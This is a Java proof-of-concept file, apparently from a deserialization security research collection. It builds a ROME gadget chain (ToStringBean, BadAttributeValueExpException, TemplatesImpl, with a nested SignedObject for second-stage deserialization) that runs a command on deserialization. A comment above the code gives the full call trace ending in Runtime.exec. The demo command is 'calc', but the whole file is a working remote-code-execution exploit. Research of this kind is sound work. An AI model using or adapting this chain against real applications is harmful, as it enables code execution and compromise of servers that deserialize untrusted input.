package com.javasec.pocs.rome;

import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.security.SignedObject;

/**
 * exec:347, Runtime (java.lang)
 * <init>:-1, a
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * toString:137, ToStringBean (com.sun.syndication.feed.impl)
 * toString:116, ToStringBean (com.sun.syndication.feed.impl)
 * readObject:86, BadAttributeValueExpException (javax.management)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * getObject:180, SignedObject (java.security)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * toString:137, ToStringBean (com.sun.syndication.feed.impl)
 * toString:116, ToStringBean (com.sun.syndication.feed.impl)
 * readObject:86, BadAttributeValueExpException (javax.management)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:66, SerializeUtils (com.javasec.utils)
 * main:21, SignObjectC (com.javasec.pocs.rome)
 */
public class SignObjectC {
    public static void main(String[] args) throws Exception{
        Templates templates = SerializeUtils.getTemplate("calc");
        ToStringBean toStringBean2 = new ToStringBean(Templates.class,templates);
        BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException("pop");
        SerializeUtils.setFieldValue(badAttributeValueExpException2,"val",toStringBean2);
        SignedObject signObject = SerializeUtils.getSignObject(badAttributeValueExpException2);
        ToStringBean toStringBean1 = new ToStringBean(SignedObject.class,signObject);
        BadAttributeValueExpException badAttributeValueExpException1 = new BadAttributeValueExpException("pop");
        SerializeUtils.setFieldValue(badAttributeValueExpException1,"val",toStringBean1);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(badAttributeValueExpException1));
    }
}
